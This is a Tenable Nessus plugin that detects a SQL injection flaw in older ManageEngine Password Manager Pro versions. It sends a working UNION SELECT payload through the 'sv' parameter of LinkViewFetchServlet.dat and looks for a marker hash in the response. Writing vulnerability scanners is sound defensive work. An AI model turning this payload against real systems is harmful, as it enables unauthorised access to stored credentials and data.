#%NASL_MIN_LEVEL 70300
##
# (C) Tenable, Inc.
##

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(80962);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/05/02");

  script_cve_id("CVE-2014-3996", "CVE-2014-3997");
  script_bugtraq_id(69303, 69305);

  script_name(english:"ManageEngine Password Manager Pro < 7.0 Build 7003 SQL Injection");
  script_summary(english:"Checks the version of ManageEngine Password Manager Pro.");

  script_set_attribute(attribute:"synopsis", value:
"The remote host is running a web application affected by a SQL
injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of ManageEngine Password Manager
Pro prior to 7.0 Build 7003. It is, therefore, affected by a SQL
injection vulnerability due to a failure to validate the 'sv'
parameter. A remote attacker can leverage this flaw to manipulate or
disclose arbitrary data.");
  # https://raw.githubusercontent.com/pedrib/PoC/master/advisories/ManageEngine/me_dc_pmp_it360_sqli.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?20e5f236");
  # http://www.manageengine.com/products/passwordmanagerpro/release-notes.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6b35a1c6");
  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine Password Manager Pro version 7.0 build 7003 or
later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2014-3996");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/08/19");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/06/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/01/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:manageengine:password_manager_pro");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("manageengine_pmp_detect.nbin");
  script_require_keys("installed_sw/ManageEngine Password Manager Pro");
  script_require_ports("Services/www", 7272);

  exit(0);
}

include('vcf.inc');
include('install_func.inc');
include('http.inc');
include('url_func.inc');

appname = 'ManageEngine Password Manager Pro';
# Stops get_http_port from branching
get_install_count(app_name:appname, exit_if_zero:TRUE);

port    = get_http_port(default:7272);
install = get_single_install(app_name:appname,port:port); # Can be launched against unknown version
version = install['display_version'];
build   = install['version'  ];
url     = build_url(port:port,qs:install['path']);
sign    = rand_str(length:8);
# This should work against both backends: MySQL/PostgreSQL
attack  = urlencode(str:'" UNION ALL SELECT MD5(\''+sign+'\') FROM AaaLogin WHERE "1"="1" OR "a"="a');
md5sum  = hexstr(MD5(sign));

res = http_send_recv3(
  method       : "GET",
  item         : "/LinkViewFetchServlet.dat?sv="+attack,
  port         : port,
  exit_on_fail : TRUE
);

if (md5sum >< res[2])
{
  security_report_v4(
    port     : port,
    sqli     : TRUE,
    request  : make_list(chomp(http_last_sent_request())),
    output   : res[2],
    severity : SECURITY_HOLE,
    generic  : TRUE
  );
  exit(0);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, url, version);
